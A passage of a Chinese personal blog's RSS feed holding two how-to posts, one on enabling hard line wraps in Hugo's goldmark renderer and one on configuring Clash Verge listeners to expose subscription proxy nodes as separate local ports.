+>&lt;/p></description></item><item><title>Hugo 博客搭建时的问题</title><link>https://yutianovo.github.com/p/hugo-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98/</link><pubDate>Mon, 25 Nov 2024 22:48:38 +0800</pubDate><guid>https://yutianovo.github.com/p/hugo-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98/</guid><description>&lt;h2 id="不会自动换行">不会自动换行
+&lt;/h2>&lt;p>打开 hugo 博客的文件夹，全局搜索 goldmark&lt;br>
+如果是 toml 格式，就改为下面的内容&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-toml" data-lang="toml">&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">goldmark&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">renderer&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">unsafe&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kc">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">hardwraps&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kc">true&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>yaml 格式&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">markup&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">goldmark&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">renderer&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">hardWraps&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>Clash Verge 将订阅中的代理地址作为单个端口开放</title><link>https://yutianovo.github.com/p/clash-verge-%E5%B0%86%E8%AE%A2%E9%98%85%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%90%86%E5%9C%B0%E5%9D%80%E4%BD%9C%E4%B8%BA%E5%8D%95%E4%B8%AA%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE/</link><pubDate>Mon, 25 Nov 2024 22:24:27 +0800</pubDate><guid>https://yutianovo.github.com/p/clash-verge-%E5%B0%86%E8%AE%A2%E9%98%85%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%90%86%E5%9C%B0%E5%9D%80%E4%BD%9C%E4%B8%BA%E5%8D%95%E4%B8%AA%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE/</guid><description>&lt;p>来到 Profile 选中订阅地址，点击右键选择 Open File 或者 Edit File&lt;/p>
+&lt;p>&lt;img src="https://yutianovo.github.com/images/Pasted%20image%2020241130213818.png"
+loading="lazy"
+alt="Image Description"
+>&lt;/p>
+&lt;p>在 proxies 上方新增如下内容&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">listeners&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">mixed-in&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">type&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">mixed&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">port&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">27891&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">listen&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">127.0.0.1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">proxy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">proxies 中的 name 字段 - 美国节点&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">users&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">admin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">password &lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">socks-in&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">type&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">socks&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">port&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">27892&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">listen&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">127.0.0.1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">proxy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">proxies 中的 name 字段 - 新加坡节点&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">http-in&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">type&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">http&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">port&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">27893&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">listen&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">127.0.0.1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">proxy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">proxies 中的 name 字段 - 香港节点&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;blockquote>
+&lt;p>[!note]&lt;br>
+当有 &lt;code>users&lt;/code> 字段时将作为需认证的代理&lt;br>
+mixed 为将socks/http合并，socks 为仅限socks，http 为仅限 http&lt;br>
+name 需要唯一&lt;br>
+proxy 字段需要填写对应的 proxies 中的 name 字段&lt;/p>
+&lt;/blockquote>
+&lt;p>以下配置将在本地启动一个节点，归属为香港，并开放同时支持 HTTP 和 SOCKS 协议的端口 &lt;code>17891&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">port: &lt;span class="m">7890&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">socks-port: &lt;span class="m">7891&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">allow-lan: &lt;span class="nb">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mode: Rule
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">log-level: info
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">external-controller: 127.0.0.1:9090
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listeners:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - name: mixed-in
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> type: mixed
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> port: &lt;span class="m">27891&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> listen: 127.0.0.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> proxy: &lt;span class="s2">&amp;#34;🇭🇰 港hk&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxies:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - &lt;span class="o">{&lt;/span>name: 🇭🇰 港hk, server: ...&lt;span class="o">[&lt;/span>snip&lt;span class="o">]&lt;/span>... true&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>完成后选择重启应用，当订阅更新时，配置将消失。&lt;/p>
+&lt;p>&lt;img src="https://yutianovo.github.com/images/Pasted%20image%2020241130213828.png"
+loading="lazy"
+alt="Image Description"
+>&lt;/p></description></item></channel></rss>
